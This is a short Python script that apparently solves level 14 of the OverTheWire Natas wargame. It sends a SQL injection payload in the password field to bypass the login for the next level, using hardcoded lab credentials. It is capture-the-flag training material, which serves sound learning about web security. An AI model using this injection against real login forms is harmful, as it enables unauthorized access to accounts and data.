import requests

url = 'http://natas14.natas.labs.overthewire.org/'

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'
auth = (username, password)


params = {'debug': 'true',
          'username': 'natas15',
          'password': "1\" OR \"1=1"
          }
response = requests.get(url, params=params, auth=auth)


if response.status_code == 200:
    print("Request was successful. Response content:")
    print(response.text)
else:
    print(f"Request failed with status code {response.status_code}")
